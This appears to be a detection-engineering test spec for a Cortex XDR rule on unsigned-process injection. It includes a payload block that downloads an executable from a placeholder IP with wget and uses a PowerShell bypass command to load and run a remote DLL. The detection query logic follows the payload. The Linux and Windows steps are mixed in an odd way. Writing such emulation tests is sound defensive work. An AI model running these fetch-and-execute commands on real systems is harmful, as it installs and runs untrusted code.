identity.description: An unsigned and unpopular process performs process injection using PowerShell, which triggers the 'Unsigned and unpopular process performed an injection' alert. Cortex should detect the suspicious PowerShell process and injection behavior.

payload.code:
wget -O /tmp/evil.exe http://192.0.2.50/malware.exe
stub chmod +x /tmp/evil.exe
powershell.exe -ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('\\192.0.2.50\\payload.dll')); [Payload.Main]::Run()"

expected_artifacts.description: PowerShell process started with suspicious command line

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unsigned and Unpopular Process Injection
biocs.description: Detection of unsigned and unpopular process performing injection
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name = 'evil.exe'
| filter causality_actor_process_image_name != 'explorer.exe'
| filter action_file_path contains '/tmp/evil.exe'
